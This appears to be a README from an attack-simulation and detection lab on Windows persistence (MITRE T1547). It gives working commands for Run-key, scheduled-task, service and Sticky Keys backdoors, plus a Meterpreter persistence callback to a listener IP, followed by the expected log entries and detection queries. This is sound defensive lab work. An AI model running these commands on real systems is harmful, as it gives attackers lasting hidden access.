# 03 - Persistence (T1547)

## Description

Persistence mechanisms allow an attacker to maintain access to a compromised system across reboots, logoffs, or other interruptions. This simulation covers the most common Windows persistence techniques.

**MITRE ATT&CK:** [T1547 - Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/)

## Sub-techniques Covered

- T1547.001 — Registry Run Keys
- T1053.005 — Scheduled Tasks
- T1543.003 — Windows Services
- T1546.008 — Accessibility Features (Sticky Keys)

## Prerequisites

- Active shell or Meterpreter session on Windows victim
- SYSTEM or Administrator privileges
- Payload from [01-process-injection](../01-process-injection/README.md) or a new payload

## Steps to Reproduce

### Method A: Registry Run Key

The `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key runs programs at user logon.

```powershell
# Add persistence via Run key (runs at every user login)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# Verify
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

From Meterpreter:

```
meterpreter > run persistence -U -i 30 -p 4444 -r 192.168.10.10
```

### Method B: Scheduled Task

```powershell
# Create a task that runs payload every hour
schtasks /create /tn "WindowsHealthCheck" /tr "C:\Users\Public\payload.exe" /sc hourly /ru SYSTEM /f

# Run immediately to test
schtasks /run /tn "WindowsHealthCheck"

# List scheduled tasks
schtasks /query /tn "WindowsHealthCheck" /fo LIST
```

### Method C: Windows Service

```powershell
# Create a service pointing to the payload
sc create "WindowsSvcHelper" binPath= "C:\Users\Public\payload.exe" start= auto
sc start "WindowsSvcHelper"

# Query service
sc query "WindowsSvcHelper"
```

### Method D: Sticky Keys Backdoor (Accessibility Feature)

```powershell
# Replace sethc.exe with cmd.exe (runs as SYSTEM on login screen with 5xShift)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

At the Windows login screen, press Shift 5 times to open a SYSTEM cmd.exe.

## Expected Log Entries

### Sysmon Event ID 13 — Registry Value Set (Run Key)

```xml
EventID: 13
EventType: SetValue
Image: C:\Windows\regedit.exe
TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
Details: C:\Users\Public\payload.exe
```

### Windows Security Event 4698 — Scheduled Task Created

```xml
EventID: 4698
TaskName: \WindowsHealthCheck
TaskContent: <Actions><Exec><Command>C:\Users\Public\payload.exe</Command></Exec></Actions>
```

### Sysmon Event ID 1 — Process Creation (service starts)

```xml
EventID: 1
Image: C:\Users\Public\payload.exe
ParentImage: C:\Windows\services.exe
User: NT AUTHORITY\SYSTEM
```

## Detection Opportunities

| Indicator | Log Source | Query |
|-----------|-----------|-------|
| Suspicious Run key added | Sysmon Event 13 | `EventID=13 TargetObject=*\CurrentVersion\Run\*` |
| Scheduled task created | Security Event 4698 | `EventID=4698 TaskName!=*Microsoft*` |
| New service installed | System Event 7045 | `EventID=7045 ServiceName!=*` |
| sethc.exe replaced | Sysmon Event 11 | `EventID=11 TargetFilename=*sethc.exe* Image!=*TrustedInstaller*` |

See [../../detections/sysmon-rules/README.md](../../detections/sysmon-rules/README.md) for detection rules.
